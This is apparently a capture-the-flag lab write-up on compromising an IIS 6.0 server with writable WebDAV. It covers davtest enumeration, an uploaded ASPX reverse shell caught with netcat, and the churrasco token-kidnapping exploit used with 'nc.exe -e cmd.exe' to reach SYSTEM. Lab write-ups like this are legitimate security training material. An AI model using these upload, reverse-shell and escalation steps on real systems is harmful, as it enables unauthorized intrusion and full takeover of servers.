# IP Address: 10.10.10.15

# Enumeration

```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.15 -t all

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0

┌──(code㉿kali)-[~]
└─$ sudo nmap -p 80 -vv --script=http-frontpage* 10.10.10.15

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html

```

### HTTP
The server is running Microsoft Frontpage version 4.0 which has misconfigured permissions. 

We enumerate file permissions using DavTest.
```
┌──(code㉿kali)-[~]
└─$ davtest -move -sendbd auto -url http://10.10.10.15
********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_o27RPgyrd
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.pl
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.txt
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.php
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.shtml
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.asp
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.aspx
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.jsp
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.html
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.cgi
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.jhtml
MOVE/PUT File: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.cfm
Executes: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.txt
Executes: http://10.10.10.15/DavTestDir_o27RPgyrd/davtest_o27RPgyrd.html
```


# Exploitation

We are able to create directories and upload files to it. Now, we upload an ASPX reverse shell, browse to the page and catch the shell with netcat. 

```
┌──(code㉿kali)-[~]
└─$ cadaver 10.10.10.15
dav:/> ls
Listing collection `/': succeeded.
Coll:   DavTestDir_o27RPgyrd                   0  Nov 21 17:37
Coll:   _private                               0  Apr 12  2017
Coll:   _vti_bin                               0  Apr 12  2017
Coll:   _vti_cnf                               0  Apr 12  2017
Coll:   _vti_log                               0  Apr 12  2017
Coll:   _vti_pvt                               0  Apr 12  2017
Coll:   _vti_script                            0  Apr 12  2017
Coll:   _vti_txt                               0  Apr 12  2017
Coll:   aspnet_client                          0  Apr 12  2017
Coll:   images                                 0  Apr 12  2017
        _vti_inf.html                       1754  Apr 12  2017
        iisstart.htm                        1433  Feb 21  2003
        pagerror.gif                        2806  Feb 21  2003
        postinfo.html                       2440  Apr 12  2017
dav:/> put shell.txt 
Uploading shell.txt to `/shell.txt':
Progress: [=============================>] 100.0% of 2718 bytes succeeded.
dav:/> copy shell.txt shell.aspx
Copying `/shell.txt' to `/shell.aspx':  succeeded.
```

```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4488                                                                                   
listening on [any] 4488 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.15] 1033
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```


# Privilege Escalation
Get the systeminfo and run windows-exploit-suggester against it. Tried a few exploits but nothing worked. Finally found a program written to exploit a WMI Service Isolation vulnerability in Windows Server 2003 SP2. 

Download churrasco.exe from here: https://github.com/Re4son/Churrasco and rename it to churrasco.txt

```
┌──(code㉿kali)-[~]
└─$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe -o churrasco.txt

```

Upload it along with nc.exe (temporarily renamed nc.txt since we can't upload files with .exe extension) to the target using cadaver. Change .txt to .exe
```
dav:/> put churrasco.txt 
Uploading churrasco.txt to `/churrasco.txt':
Progress: [=============================>] 100.0% of 31232 bytes succeeded.
dav:/> move churrasco.txt churrasco.exe
Moving `/churrasco.txt' to `/churrasco.exe':  succeeded.
dav:/> put nc.txt 
Uploading nc.txt to `/nc.txt':
Progress: [=============================>] 100.0% of 59392 bytes succeeded.
dav:/> move nc.txt nc.exe
Moving `/nc.txt' to `/nc.exe':  succeeded.
```

On the target shell we caught, run churrasco.exe
```
C:\Inetpub\wwwroot>churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.17 4499"
churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.17 4499"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

```
┌──(code㉿kali)-[~]
└─$ nc -nlvp 4499
listening on [any] 4499 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.15] 1052
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

```


# Proof
user.txt

![[Pasted image 20211121195349.png]]


root.txt

![[Pasted image 20211121195444.png]]